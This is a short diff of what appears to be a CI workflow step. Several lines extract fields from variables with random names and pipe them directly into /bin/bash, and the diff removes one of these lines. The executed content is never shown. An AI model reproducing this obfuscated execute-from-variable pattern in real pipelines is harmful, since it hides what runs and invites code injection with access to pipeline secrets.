@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$tuzpt70" | jq -r .m9 | /bin/bash
           echo $t66 | jq -r .frnpn53 | /bin/bash
-          echo $gnw65 | jq -r .xw882 | /bin/bash
           printf '%s' "$ol64" | jq -r .cqr2 | /bin/bash
           echo $idbx05657 | jq -r .chk2 | /bin/bash
           echo $bnht166 | jq -r .ys9 | /bin/bash
